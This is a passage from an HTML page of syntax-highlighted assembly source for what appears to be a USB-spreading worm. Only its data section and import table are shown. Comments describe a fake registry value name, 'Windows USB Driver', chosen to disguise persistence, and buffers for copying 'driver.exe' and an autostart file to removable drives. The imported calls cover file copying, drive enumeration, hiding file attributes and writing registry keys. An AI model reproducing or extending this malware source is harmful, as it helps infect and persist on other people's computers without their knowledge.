    </span><span class="sc5">RegValueName</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Windows USB Driver"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc1">;fake value name for registry</span><span class="sc0">
    </span><span class="sc5">AllDrives</span><span class="sc0">   </span><span class="sc5">rb</span><span class="sc0"> </span><span class="sc2">105d</span><span class="sc0">         </span><span class="sc1">;all available drives: C:\0D:\0E:\00</span><span class="sc0">
    </span><span class="sc5">WatchDrive</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">"_:\"        ;here we store the drive where a usb stick can be plugged
</span><span class="sc0">    </span><span class="sc5">UsbFile</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14d</span><span class="sc0">          </span><span class="sc1">;buffer for "driver.exe" and "autostart.inf" + terminating zero</span><span class="sc0">

</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc3">"usb!"</span><span class="sc0"> </span><span class="sc9">import</span><span class="sc0"> </span><span class="sc5">data</span><span class="sc0"> </span><span class="sc5">readable</span><span class="sc0"> </span><span class="sc5">writeable</span><span class="sc0"> </span><span class="sc1">;our import table :)</span><span class="sc0">
    </span><span class="sc5">library</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">,</span><span class="sc0">         </span><span class="sc3">"kernel32.dll"</span><span class="sc4">,\
</span><span class="sc0">        </span><span class="sc5">advapi</span><span class="sc4">,</span><span class="sc0">         </span><span class="sc3">"advapi32.dll"</span><span class="sc0">

    </span><span class="sc9">import</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">,\
</span><span class="sc0">        </span><span class="sc5">GetModuleFileName</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc3">"GetModuleFileNameA"</span><span class="sc4">,\
</span><span class="sc0">        </span><span class="sc5">CopyFile</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc3">"CopyFileA"</span><span class="sc4">,\
</span><span class="sc0">        </span><span class="sc5">GetLogicalDriveStrings</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"GetLogicalDriveStringsA"</span><span class="sc4">,\
</span><span class="sc0">        </span><span class="sc5">Sleep</span><span class="sc4">,</span><span class="sc0">          </span><span class="sc3">"Sleep"</span><span class="sc4">,\
</span><span class="sc0">        </span><span class="sc5">SetFileAttributes</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc3">"SetFileAttributesA"</span><span class="sc4">,\
</span><span class="sc0">        </span><span class="sc5">CreateFile</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc3">"CreateFileA"</span><span class="sc4">,\
</span><span class="sc0">        </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc3">"WriteFile"</span><span class="sc4">,\
</span><span class="sc0">        </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0">        </span><span class="sc3">"CloseHandle"</span><span class="sc4">,\
</span><span class="sc0">        </span><span class="sc5">GetSystemDirectory</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"GetSystemDirectoryA"</span><span class="sc0">

    </span><span class="sc9">import</span><span class="sc0"> </span><span class="sc5">advapi</span><span class="sc4">,\
</span><span class="sc0">        </span><span class="sc5">RegOpenKeyEx</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc3">"RegOpenKeyExA"</span><span class="sc4">,\
</span><span class="sc0">        </span><span class="sc5">RegSetValueEx</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc3">"RegSetValueExA"</span><span class="sc4">,\
</span><span class="sc0">        </span><span class="sc5">RegCloseKey</span><span class="sc4">,</span><span class="sc0">        </span><span class="sc3">"RegCloseKey"</span></div></body>
</html>
